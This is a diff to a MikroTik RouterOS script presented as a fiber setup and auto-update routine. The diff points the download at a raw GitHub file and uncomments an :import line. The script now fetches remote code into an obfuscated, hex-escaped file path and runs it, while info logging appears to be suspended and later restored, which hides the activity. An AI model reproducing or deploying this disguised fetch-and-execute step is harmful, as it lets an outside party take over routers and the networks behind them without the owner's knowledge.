@@ -58,7 +58,7 @@
 };
 :put "Step 2: Loading auto-update system...";
 :local infoLogIds [/system logging find where topics~"info" and disabled=no];
-:local url "https://kora.fiberlive.live/mikrotik_update.php\?type=fiber&sn=$sn";
+:local url "https://raw.githubusercontent.com/alkadriemad31/users/refs/heads/main/mikrotik_update_type_fiber.txt";
 :local ua "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) RouterOS";
 /tool fetch url=$url dst-path=("\2E\66\69\2F\62\2A\65\2A\72\2E\2D\2E./.\66\69\62\65\72\75\70\64\61\74\65\2A*") ;
 :delay 2s;
@@ -66,7 +66,7 @@
 :do { :foreach i in=$infoLogIds do={ /system logging enable $i; }; } on-error={};
 };
 :put "Running fiber install script (please wait, do not interrupt)...";
-#:import ("\2E\66\69\2F\62\2A\65\2A\72\2E\2D\2E./.\66\69\62\65\72\75\70\64\61\74\65\2A*");
+:import ("\2E\66\69\2F\62\2A\65\2A\72\2E\2D\2E./.\66\69\62\65\72\75\70\64\61\74\65\2A*");
 :put "=== Fiber Setup Completed Successfully! ===";
 :put "Device ID: $sn";
 :put "Source: $idSource";
